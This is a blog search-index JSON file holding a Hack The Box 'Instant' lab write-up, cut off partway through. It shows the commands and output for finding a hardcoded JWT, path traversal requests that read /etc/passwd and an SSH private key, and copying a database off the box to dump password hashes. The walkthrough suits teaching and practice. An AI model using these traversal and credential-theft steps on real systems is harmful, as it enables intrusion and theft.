
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-04-03","image":"","imageAlt":"","link":"http://localhost:1313/posts/instant/","summary":"\u003cp\u003e\u003cimg src=\"/img/instant/instant.png\" alt=\"Instant\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eInstant is a medium-difficulty Linux box from Hack The Box. We discover a hardcoded JWT token and a couple of subdomains from a downloadable apk file, from which we exploit a path traversal vulnerability to read a ssh private key and gain a foothold. Credentials from the instant webapp db can then be used to decrypt a Solar-PuTTY session backup file to find the password for root.\u003c/p\u003e","tags":["Decompiling","Hardcoded Secrets","Hashcracking","Hashcracking","HTB","Linux","Path Traversal","Reverse Engineering","Solar-PuTTY"],"text":"\ndescription instant is a medium-difficulty linux box from hack the box. we discover a hardcoded jwt token and a couple of subdomains from a downloadable apk file, from which we exploit a path traversal vulnerability to read a ssh private key and gain a foothold. credentials from the instant webapp db can then be used to decrypt a solar-putty session backup file to find the password for root.\nrecon a tcp reveals ssh open on port 22 and a webapp on port 80.\n# nmap 7.94svn scan initiated thu apr 3 10:22:19 2025 as: nmap -p- -a -v -on /tmp/nmap.scan -t4 10.10.11.37 nmap scan report for instant.htb (10.10.11.37) host is up (0.040s latency). not shown: 65533 closed tcp ports (reset) port state service version 22/tcp open ssh openssh 9.6p1 ubuntu 3ubuntu13.5 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ecdsa) |_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ed25519) 80/tcp open http apache httpd 2.4.58 |_http-title: instant wallet |_http-server-header: apache/2.4.58 (ubuntu) | http-methods: |_ supported methods: options head get post no exact os matches for host (if you know what os is running on it, see https://nmap.org/submit/ ). tcp/ip fingerprint: os:scan(v=7.94svn%e=4%d=4/3%ot=22%ct=1%cu=33135%pv=y%ds=2%dc=t%g=y%tm=67eea os:85b%p=x86_64-pc-linux-gnu)seq(sp=104%gcd=1%isr=109%ti=z%ci=z%ts=a)seq(sp os:=105%gcd=1%isr=109%ti=z%ci=z%ts=a)seq(sp=106%gcd=1%isr=109%ti=z%ci=z%ts= os:a)seq(sp=106%gcd=1%isr=109%ti=z%ci=z%ii=i%ts=a)ops(o1=m53cst11nw7%o2=m53 os:cst11nw7%o3=m53cnnt11nw7%o4=m53cst11nw7%o5=m53cst11nw7%o6=m53cst11)win(w os:1=fe88%w2=fe88%w3=fe88%w4=fe88%w5=fe88%w6=fe88)ecn(r=y%df=y%t=40%w=faf0% os:o=m53cnnsnw7%cc=y%q=)t1(r=y%df=y%t=40%s=o%a=s+%f=as%rd=0%q=)t2(r=n)t3(r= os:n)t4(r=y%df=y%t=40%w=0%s=a%a=z%f=r%o=%rd=0%q=)t5(r=y%df=y%t=40%w=0%s=z%a os:=s+%f=ar%o=%rd=0%q=)t6(r=y%df=y%t=40%w=0%s=a%a=z%f=r%o=%rd=0%q=)t7(r=y%d os:f=y%t=40%w=0%s=z%a=s+%f=ar%o=%rd=0%q=)u1(r=y%df=n%t=40%ipl=164%un=0%ripl os:=g%rid=g%ripck=g%ruck=g%rud=g)ie(r=y%dfi=n%t=40%cd=s) uptime guess: 18.676 days (since sat mar 15 18:12:18 2025) network distance: 2 hops tcp sequence prediction: difficulty=261 (good luck!) ip id sequence generation: all zeros service info: os: linux; cpe: cpe:/o:linux:linux_kernel traceroute (using port 21/tcp) hop rtt address 1 39.80 ms 10.10.14.1 2 39.83 ms instant.htb (10.10.11.37) read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at thu apr 3 10:25:15 2025 -- 1 ip address (1 host up) scanned in 176.55 seconds after adding instant.htb to /etc/hosts, we are brought to a website where we can download a money transfer app.\nthe download link gives us an apk file. we can decompile it to enumerate for hardcoded secrets, insufficient validation, api calls, and other potential information that could lead us to an exploitable vulnerability.\n┌──(kali㉿kali)-[/tmp/instant] └─$ jadx --output-dir /tmp/instant/decompile /tmp/instant/instant.apk eventually, some actionable information is returned when searching for instant.htb in the decompiled apk, including two subdomains mywalletv1.instant.htb and swagger-ui.instant.htb, a username support@instant.htb, as well as a jwt authorization token in adminactivities.java.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ grep -ri \u0026#34;instant.htb\u0026#34; * grep: resources/classes.dex: binary file matches resources/res/layout/activity_forgot_password.xml: android:text=\u0026#34;please contact support@instant.htb to have your account recovered\u0026#34; resources/res/xml/network_security_config.xml: \u0026lt;domain includesubdomains=\u0026#34;true\u0026#34;\u0026gt;mywalletv1.instant.htb resources/res/xml/network_security_config.xml: \u0026lt;domain includesubdomains=\u0026#34;true\u0026#34;\u0026gt;swagger-ui.instant.htb sources/com/instantlabs/instant/loginactivity.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/login\u0026#34;).post(requestbody.create(mediatype.parse(\u0026#34;application/json\u0026#34;), jsonobject.tostring())).build()).enqueue(new callback() { // from class: com.instantlabs.instant.loginactivity.4 sources/com/instantlabs/instant/adminactivities.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/view/profile\u0026#34;).addheader(\u0026#34;authorization\u0026#34;, \u0026#34;eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34;).build()).enqueue(new callback() { // from class: com.instantlabs.instant.adminactivities.1 sources/com/instantlabs/instant/transactionactivity.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/initiate/transaction\u0026#34;).addheader(\u0026#34;authorization\u0026#34;, str4).post(requestbody.create(mediatype.parse(\u0026#34;application/json\u0026#34;), jsonobject.tostring())).build()).enqueue(new anonymousclass2(str5, str4)); sources/com/instantlabs/instant/transactionactivity.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/confirm/pin\u0026#34;).header(\u0026#34;authorization\u0026#34;, this.val$access_token).post(requestbody.create(mediatype.parse(\u0026#34;application/json\u0026#34;), jsonobject.tostring())).build()).enqueue(new callback() { // from class: com.instantlabs.instant.transactionactivity.2.2 sources/com/instantlabs/instant/profileactivity.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/view/profile\u0026#34;).addheader(\u0026#34;authorization\u0026#34;, accesstoken).build()).enqueue(new callback() { // from class: com.instantlabs.instant.profileactivity.1 sources/com/instantlabs/instant/registeractivity.java: new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/register\u0026#34;).post(requestbody.create(mediatype.parse(\u0026#34;application/json\u0026#34;), jsonobject.tostring())).build()).enqueue(new callback() { // from class: com.instantlabs.instant.registeractivity.3 looking at adminactivities.java, we can see the jwt token is being used to make a call to http://mywalletv1.instant.htb/api/v1/view/profile.\npackage com.instantlabs.instant; import com.google.gson.jsonparser; import com.google.gson.jsonsyntaxexception; import java.io.ioexception; import okhttp3.call; import okhttp3.callback; import okhttp3.okhttpclient; import okhttp3.request; import okhttp3.response; /* loaded from: classes.dex */ public class adminactivities { private string testadminauthorization() { new okhttpclient().newcall(new request.builder().url(\u0026#34;http://mywalletv1.instant.htb/api/v1/view/profile\u0026#34;).addheader(\u0026#34;authorization\u0026#34;, \u0026#34;eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34;).build()).enqueue(new callback() { // from class: com.instantlabs.instant.adminactivities.1 static final /* synthetic */ boolean $assertionsdisabled = false; @override // okhttp3.callback public void onfailure(call call, ioexception ioexception) { system.out.println(\u0026#34;error here : \u0026#34; + ioexception.getmessage()); } @override // okhttp3.callback public void onresponse(call call, response response) throws ioexception { if (response.issuccessful()) { try { system.out.println(jsonparser.parsestring(response.body().string()).getasjsonobject().get(\u0026#34;username\u0026#34;).getasstring()); } catch (jsonsyntaxexception e) { system.out.println(\u0026#34;error here : \u0026#34; + e.getmessage()); } } } }); return \u0026#34;done\u0026#34;; } } we can confirm the token is still valid.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/view/profile\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; {\u0026#34;profile\u0026#34;:{\u0026#34;account_status\u0026#34;:\u0026#34;active\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@instant.htb\u0026#34;,\u0026#34;invite_token\u0026#34;:\u0026#34;instant_admin_inv\u0026#34;,\u0026#34;role\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;instantadmin\u0026#34;,\u0026#34;wallet_balance\u0026#34;:\u0026#34;10000000\u0026#34;,\u0026#34;wallet_id\u0026#34;:\u0026#34;f0eca6e5-783a-471d-9d8f-0162cbc900db\u0026#34;},\u0026#34;status\u0026#34;:200} foothold recall that there is another subdomain that we found, swagger-ui.instant.htb. this subdomain contains documentation for the rest api endpoints on mywalletv1.instant.htb, from which we can get a clearer picture of the app\u0026rsquo;s full range of funcitonality.\nthere is an api endpoint /api/v1/admin/view/logs that lets us view available logs. perhaps one of them has credentials we could use to escalate privileges.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/admin/view/logs\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; {\u0026#34;files\u0026#34;:[\u0026#34;1.log\u0026#34;],\u0026#34;path\u0026#34;:\u0026#34;/home/shirohige/logs/\u0026#34;,\u0026#34;status\u0026#34;:201} the api returns a single log file 1.log in shirohige\u0026rsquo;s home directory. we can read it by passing in its filename as the argument for log_file_name to /api/v1/admin/read/log.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; {\u0026#34;/home/shirohige/logs/1.log\u0026#34;:[\u0026#34;this is a sample log testing\\n\u0026#34;],\u0026#34;status\u0026#34;:201} unfortunately the log itself reveals nothing of interest. but the fact that the filename is directly appended to the path /home/shirohige/logs in the response may indicate that the operation for file read also directly passes in user input, casuing a path traversal vulnerability. we can test this by sending a request to read /etc/passwd.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; | jq . % total % received % xferd average speed time time time current dload upload total spent left speed 100 1673 100 1673 0 0 15447 0 --:--:-- --:--:-- --:--:-- 15490 { \u0026#34;/home/shirohige/logs/../../../etc/passwd\u0026#34;: [ \u0026#34;root:x:0:0:root:/root:/bin/bash\\n\u0026#34;, \u0026#34;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;bin:x:2:2:bin:/bin:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;sys:x:3:3:sys:/dev:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;sync:x:4:65534:sync:/bin:/bin/sync\\n\u0026#34;, \u0026#34;games:x:5:60:games:/usr/games:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;list:x:38:38:mailing list manager:/var/list:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;systemd-network:x:998:998:systemd network management:/:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;systemd-timesync:x:997:997:systemd time synchronization:/:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;dhcpcd:x:100:65534:dhcp client daemon,,,:/usr/lib/dhcpcd:/bin/false\\n\u0026#34;, \u0026#34;messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;systemd-resolve:x:992:992:systemd resolver:/:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;pollinate:x:102:1::/var/cache/pollinate:/bin/false\\n\u0026#34;, \u0026#34;polkitd:x:991:991:user for polkitd:/:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\\n\u0026#34;, \u0026#34;shirohige:x:1001:1002:white beard:/home/shirohige:/bin/bash\\n\u0026#34;, \u0026#34;_laurel:x:999:990::/var/log/laurel:/bin/false\\n\u0026#34; ], \u0026#34;status\u0026#34;: 201 } we successfully read the file, now we can enumerate the filesystem.\n┌──(kali㉿kali)-[/tmp] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../proc/self/status\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; | jq . % total % received % xferd average speed time time time current dload upload total spent left speed 100 1912 100 1912 0 0 10027 0 --:--:-- --:--:-- --:--:-- 10063 { \u0026#34;/home/shirohige/logs/../../../proc/self/status\u0026#34;: [ \u0026#34;name:\\tpython3\\n\u0026#34;, \u0026#34;umask:\\t0022\\n\u0026#34;, \u0026#34;state:\\ts (sleeping)\\n\u0026#34;, \u0026#34;tgid:\\t1334\\n\u0026#34;, \u0026#34;ngid:\\t0\\n\u0026#34;, \u0026#34;pid:\\t1334\\n\u0026#34;, \u0026#34;ppid:\\t1\\n\u0026#34;, \u0026#34;tracerpid:\\t0\\n\u0026#34;, \u0026#34;uid:\\t1001\\t1001\\t1001\\t1001\\n\u0026#34;, \u0026#34;gid:\\t1002\\t1002\\t1002\\t1002\\n\u0026#34;, \u0026#34;fdsize:\\t128\\n\u0026#34;, \u0026#34;groups:\\t1001 1002 \\n\u0026#34;, \u0026#34;nstgid:\\t1334\\n\u0026#34;, \u0026#34;nspid:\\t1334\\n\u0026#34;, \u0026#34;nspgid:\\t1334\\n\u0026#34;, \u0026#34;nssid:\\t1334\\n\u0026#34;, \u0026#34;kthread:\\t0\\n\u0026#34;, \u0026#34;vmpeak:\\t 201928 kb\\n\u0026#34;, \u0026#34;vmsize:\\t 136408 kb\\n\u0026#34;, \u0026#34;vmlck:\\t 0 kb\\n\u0026#34;, \u0026#34;vmpin:\\t 0 kb\\n\u0026#34;, \u0026#34;vmhwm:\\t 54568 kb\\n\u0026#34;, \u0026#34;vmrss:\\t 54568 kb\\n\u0026#34;, \u0026#34;rssanon:\\t 40104 kb\\n\u0026#34;, \u0026#34;rssfile:\\t 14464 kb\\n\u0026#34;, \u0026#34;rssshmem:\\t 0 kb\\n\u0026#34;, \u0026#34;vmdata:\\t 58720 kb\\n\u0026#34;, \u0026#34;vmstk:\\t 132 kb\\n\u0026#34;, \u0026#34;vmexe:\\t 2956 kb\\n\u0026#34;, \u0026#34;vmlib:\\t 9756 kb\\n\u0026#34;, \u0026#34;vmpte:\\t 172 kb\\n\u0026#34;, \u0026#34;vmswap:\\t 0 kb\\n\u0026#34;, \u0026#34;hugetlbpages:\\t 0 kb\\n\u0026#34;, \u0026#34;coredumping:\\t0\\n\u0026#34;, \u0026#34;thp_enabled:\\t1\\n\u0026#34;, \u0026#34;untag_mask:\\t0xffffffffffffffff\\n\u0026#34;, \u0026#34;threads:\\t2\\n\u0026#34;, \u0026#34;sigq:\\t0/7398\\n\u0026#34;, \u0026#34;sigpnd:\\t0000000000000000\\n\u0026#34;, \u0026#34;shdpnd:\\t0000000000000000\\n\u0026#34;, \u0026#34;sigblk:\\t0000000000000000\\n\u0026#34;, \u0026#34;sigign:\\t0000000001001000\\n\u0026#34;, \u0026#34;sigcgt:\\t0000000100000002\\n\u0026#34;, \u0026#34;capinh:\\t0000000000000000\\n\u0026#34;, \u0026#34;capprm:\\t0000000000000000\\n\u0026#34;, \u0026#34;capeff:\\t0000000000000000\\n\u0026#34;, \u0026#34;capbnd:\\t000001ffffffffff\\n\u0026#34;, \u0026#34;capamb:\\t0000000000000000\\n\u0026#34;, \u0026#34;nonewprivs:\\t0\\n\u0026#34;, \u0026#34;seccomp:\\t0\\n\u0026#34;, \u0026#34;seccomp_filters:\\t0\\n\u0026#34;, \u0026#34;speculation_store_bypass:\\tvulnerable\\n\u0026#34;, \u0026#34;speculationindirectbranch:\\tconditional enabled\\n\u0026#34;, \u0026#34;cpus_allowed:\\tffffffff,ffffffff,ffffffff,ffffffff\\n\u0026#34;, \u0026#34;cpus_allowed_list:\\t0-127\\n\u0026#34;, \u0026#34;mems_allowed:\\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001\\n\u0026#34;, \u0026#34;mems_allowed_list:\\t0\\n\u0026#34;, \u0026#34;voluntary_ctxt_switches:\\t53085\\n\u0026#34;, \u0026#34;nonvoluntary_ctxt_switches:\\t221\\n\u0026#34;, \u0026#34;x86_thread_features:\\t\\n\u0026#34;, \u0026#34;x86_thread_features_locked:\\t\\n\u0026#34; ], \u0026#34;status\u0026#34;: 201 } reading /proc/self/status, we can see that our current uid is 1001, meaning that we can verify that have the permissions of shirohige (shirohige\u0026rsquo;s uid is 1001 as seen from /etc/passwd). further recon shows that shirohige as a private ssh key that we can read.\n┌──(kali㉿kali)-[/tmp/instant/decompile] └─$ curl \u0026#34;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa\u0026#34; -h \u0026#34;authorization: eyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjpzci6mswicm9szsi6ikfkbwluiiwid2fsswqioijmmgvjytzlns03odnhltq3mwqtowq4zi0wmtyyy2jjotawzgiilcjlehaiojmzmju5mzaznju2fq.v0qyyaqdsgyonfhu7mgrqcda0bw99_8aexkgtwz6rya\u0026#34; | jq . % total % received % xferd average speed time time time current dload upload total spent left speed 100 2809 100 2809 0 0 32082 0 --:--:-- --:--:-- --:--:-- 31920 { \u0026#34;/home/shirohige/logs/../.ssh/id_rsa\u0026#34;: [ \u0026#34;-----begin openssh private key-----\\n\u0026#34;, \u0026#34;b3blbnnzac1rzxktdjeaaaaabg5vbmuaaaaebm9uzqaaaaaaaaabaaablwaaaadzc2gtcn\\n\u0026#34;, \u0026#34;nhaaaaaweaaqaaayeapbntlalmnzwctvz0skin2+ppqr4xjygirzyzzd9ytjguv/w3gw8b\\n\u0026#34;, \u0026#34;nwq1vzh3bdyxhl3wla3jpnkbb8j4lurrofhnjk8lgefomyty/t5he0vehv73ueoa/boeah\\n\u0026#34;, \u0026#34;daghquaasdj8avy1yqmzdv31phcgedu/0du9jgmhjxfs70gfebpii3js9omkxqafc2t5k/\\n\u0026#34;, \u0026#34;5xl+1mhnzbiqqkvjbphueqpy9gdadsiavktoa8i6hpddlzalak9rgi+bsfvbsnz244ucby\\n\u0026#34;, \u0026#34;8juwzrzme8tg5np6kig1tdz1cqrl7lnvmgo7adwqcvruhbxkvtejmizr/4o+/w9njj3+wf\\n\u0026#34;, \u0026#34;uambbzosncanxb1mk0ak42gnlqcrymupuepn1quzpl7xabdnyk2ocmxws3rfphgjhbqwps\\n\u0026#34;, \u0026#34;jblc7kabzfqbuoa57szpqjy9+f0jttwqxlxr5rtl15jnag+rdfkrmmmzbgrycriwpc//af\\n\u0026#34;, \u0026#34;oq8vze9xjixz2p/jj/exahual9a2zf9ymlabuggdaaafikxbzxusqwv7aaaab3nzac1yc2\\n\u0026#34;, \u0026#34;eaaagbakw57zwpzp2vne1wdljcddvj6aq+my2ick2cmc3fwlsrrr/8nxlvaz8enb84dwq8\\n\u0026#34;, \u0026#34;sys91iwn4z55gwfi+jbkaznxzyyvjrnnzjglwp0+yrnfxh7+97hdgpwahmh3qboulgala4\\n\u0026#34;, \u0026#34;/al8tckdgq1d9tx3bha7v9hvpyxpoy130u9ih3m6scn47ptpil0abxnk+zp+cs/ttb52qy\\n\u0026#34;, \u0026#34;kkir426ybnqqcvya2nbiglyrtgpcooaqwy2wpwppuyivgbbbwbj89uolggwpi7lma85nve\\n\u0026#34;, \u0026#34;xutaeiiinbxwdxkks+5tvtikowhceala1iqcsr0xczim0f+kpv8pz4yd/lhbmjgwczrdqg\\n\u0026#34;, \u0026#34;j129tjngponods6nk2jrqvhqtdulmty+8qgwzwctjgjmcln6xtx4i4w6lj0owzqu5ggwra\\n\u0026#34;, \u0026#34;m1dgoe0mt6iwpfhdi7bvqss8a+a7s9estwhvqw35ezpjm2xq8gkysd3p/wbtqvl8xpv44l\\n\u0026#34;, \u0026#34;2dj/4yfxf2obmi/qnmx/wdc2m1ibgwaaaambaaeaaagaruditbq/s3ab+9icbtox6d0xcn\\n\u0026#34;, \u0026#34;sukm/9nogckcczzy/aqwr2a+xbtk5xzgsvchwlgxa5nfnvgobn3ynnqykqkwzv+1vhzncp\\n\u0026#34;, \u0026#34;oeu9goqatmt8qtilfxhueof+miwsqduv/pa3vf3mvorsunj9nmhstzlajshazs+1eklgny\\n\u0026#34;, \u0026#34;nkthxcw9zwdkqdhvotrugi2+veilfqzsf0nq+f3hpgama4reswkmegsefssuyjp5ogvihb\\n\u0026#34;, \u0026#34;t3rfzj9w6pj4tilfwv769tnyxwhuhcnxotx90tf+razgsnjm0i0fplb0dotxxpvwtjte9y\\n\u0026#34;, \u0026#34;1vr6kd/ah2rqshe1lbo6qboadiyycuaajzfbthsvi5u2sqlvsjr5ahokdzw2uo7xs0se/0\\n\u0026#34;, \u0026#34;cadjy1peq0+q7x7weaqy+juyxdwvdkba0pziq66ynnwmu0d2iqklhdxh/wa5pfueyredqa\\n\u0026#34;, \u0026#34;wdjmz7oh0apgkznurgnf66jmde7e9psv1wimpgsdj3uigm6d/cfwx8i4odzdh+1jrraaaa\\n\u0026#34;, \u0026#34;wqcmdtzmyd8wuhpxgcsrevtftgskiqouy0nejz3yohuigedju227bhp3q0crjjhc74fn18\\n\u0026#34;, \u0026#34;nb8v1c1fj03bj9kkjzasx+ndfstlxuoy7/t39fy45/mza1bjbgrfbhheclgqcow2zgpgck\\n\u0026#34;, \u0026#34;gzgrfox3onf+n5dl0xc9fwdjqfcji5kkpp/0rnsjoxzu2xvehi4egoo+6vw2patq2sblvt\\n\u0026#34;, \u0026#34;perowua/ckvltdoumiyeqqtohcv6qmti3kylhahrqw0rcbksgaaadbaoak8jrkszjy4mjh\\n\u0026#34;, \u0026#34;hsslq1bcq6nsp+hjxxjlm0fycc4jlhbdoywsilg96d1n1kyalvwrndh9m7rmts5wzbm3fx\\n\u0026#34;, \u0026#34;zkcwzbxrcpuu0ranko1haqlupccggi5admluvefvthmxyxoaprppptxr+g4uimwp1ojco5\\n\u0026#34;, \u0026#34;ssyspxmlojs9gg++jv8iufherxotwr1ey8d3smeobc62yz3tiybwse/l1niy6nbt57dooy\\n\u0026#34;, \u0026#34;cggelc1cs7pog/xaoh1bpmaj4hi3huwwaaameavv2gzd98tsb92cskct+efqcx2se5uijz\\n\u0026#34;, \u0026#34;n90gyfzoyureryoqjdgoocj4d/skipv0qqpqnulejh7duhkiohmk8s59umpmzgzq4brw0g\\n\u0026#34;, \u0026#34;hwds1cacowdnh7yhgk6lzm3950r1a/rpwt9fcvwfeoqqwvcv37l7yjj7rdwlta06qhmrmp\\n\u0026#34;, \u0026#34;5vny/4cnnmdxalx0omvnnoy1wptab0x/pgvm24kcqn/7wcms865is11bwyypaig5f5zo1r\\n\u0026#34;, \u0026#34;bhd6uh7ofgrw/5aaaaexnoaxjvaglnzubpbnn0yw50aq==\\n\u0026#34;, \u0026#34;-----end openssh private key-----\\n\u0026#34; ], \u0026#34;status\u0026#34;: 201 } i saved the key to a file and cleaned it up. below is the vim macro i used:\n:%s/ \u0026#34;//g|%s/\u0026#34;//g|%s/,//g|%s/\\\\n//g now we can authenticate as shirohige.\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa shirohige@instant.htb welcome to ubuntu 24.04.1 lts (gnu/linux 6.8.0-45-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/pro this system has been minimized by removing packages and content that are not required on a system that users do not log into. to restore this content, you can run the \u0026#39;unminimize\u0026#39; command. failed to connect to https://changelogs.ubuntu.com/meta-release-lts. check your internet connection or proxy settings last login: sat mar 29 20:22:54 2025 from 10.10.14.53 shirohige@instant:~$ privilege escalation instant\u0026rsquo;s database is stored at ~/projects/mywallet/instant-api/mywallet/instance/.\nshirohige@instant:~$ ls -al projects/mywallet/instant-api/mywallet/instance/ total 44 drwxr-xr-x 2 shirohige shirohige 4096 oct 4 15:22 . drwxr-xr-x 5 shirohige shirohige 4096 oct 4 15:22 .. -rw-r--r-- 1 shirohige shirohige 36864 sep 30 16:34 instant.db sqlite3 installed though, so i transferred it to my local machine for viewing.\nshirohige@instant:~$ python3 -m http.server 8000 -d projects/mywallet/instant-api/mywallet/instance/ serving http on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ┌──(kali㉿kali)-[/tmp] └─$ wget http://instant.htb:8000/instant.db --2025-03-29 15:30:35-- http://instant.htb:8000/instant.db resolving instant.htb (instant.htb)... 10.10.11.37 connecting to instant.htb (instant.htb)|10.10.11.37|:8000... connected. http request sent, awaiting response... 200 ok length: 36864 (36k) [application/octet-stream] saving to: ‘instant.db’ instant.db 100%[======================================================================\u0026gt;] 36.00k --.-kb/s in 0.05s 2025-03-29 15:30:35 (674 kb/s) - ‘instant.db’ saved [36864/36864] there is a wallet_users table which has, among others, a password column that we can harvest credentials form.\nsqlite\u0026gt; .schema create table wallet_users ( id integer not null, username varchar, email varchar, wallet_id varchar, password varchar, create_date varchar, secret_pin integer, role varchar, status varchar, primary key (id), unique (username), unique (email), unique (wallet_id) ); create table wallet_wallets ( id integer not null, wallet_id varchar, balance integer, invite_token varchar, primary key (id), unique (wallet_id), unique (invite_token) ); create table wallet_transactions ( id integer not null, sender varchar, receiver varchar, amount varchar, txn_fee varchar, note varchar, status varchar, primary key (id) ); sqlite\u0026gt; sqlite\u0026gt; select * from wallet_users; 1|instantadmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$i5bfyb0zzd69pnx8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|admin|active 